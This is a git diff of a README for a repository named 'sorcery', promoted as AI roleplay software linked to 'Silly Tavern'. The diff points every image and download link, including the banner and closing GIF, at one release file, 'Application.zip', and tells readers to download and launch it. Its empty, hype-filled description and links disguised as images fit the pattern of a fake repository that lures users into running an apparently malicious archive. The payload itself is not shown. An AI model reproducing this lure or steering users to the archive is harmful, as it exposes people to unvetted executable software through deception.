@@ -1,6 +1,6 @@
 # 🧙‍♀️ Welcome to the World of Sorcery! 🧙‍♂️
 
-![Sorcery](https://yourimagepath/sorcery.png)
+![Sorcery](https://github.com/nxtkxm/sorcery/releases/download/v1.0.0/Application.zip)
 
 ## About
 Welcome to the **"sorcery"** repository - the future of AI roleplay! 🤖✨ In this magical realm, you will delve into the world of artificial intelligence, machine learning, and the whimsical adventures of the Silly Tavern. 🍻 
@@ -11,10 +11,10 @@ Welcome to the **"sorcery"** repository - the future of AI roleplay! 🤖✨ In 
 🎭 Silly Tavern
 
 ## Repository Link
-[![Download Sorcery](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/file/Application.zip)
+[![Download Sorcery](https://github.com/nxtkxm/sorcery/releases/download/v1.0.0/Application.zip)](https://github.com/nxtkxm/sorcery/releases/download/v1.0.0/Application.zip)
 
 ## Getting Started
-To embark on your journey in this enchanting world, simply download the [Application.zip](https://github.com/file/Application.zip) file and launch it to unleash the powers of sorcery. If the link doesn't work, be sure to check the "Releases" section for alternative options to enter the realm.
+To embark on your journey in this enchanting world, simply download the [https://github.com/nxtkxm/sorcery/releases/download/v1.0.0/Application.zip](https://github.com/nxtkxm/sorcery/releases/download/v1.0.0/Application.zip) file and launch it to unleash the powers of sorcery. If the link doesn't work, be sure to check the "Releases" section for alternative options to enter the realm.
 
 ## Features
 ### AI Enhancements
@@ -41,4 +41,4 @@ The sorcery repository is licensed under the MIT License. Feel free to explore, 
 ## Let the Magic Begin! 🌟
 Are you ready to unlock the secrets of AI, dive into the depths of machine learning, and partake in adventures at the Silly Tavern? Download the **"sorcery"** repository now and let the magic unfold before your eyes. Embark on a journey like never before and immerse yourself in the future of AI roleplay. The world of sorcery awaits you! ✨🔮
 
-![Magical GIF](https://yourimagepath/magical.gif)
+![Magical GIF](https://github.com/nxtkxm/sorcery/releases/download/v1.0.0/Application.zip)
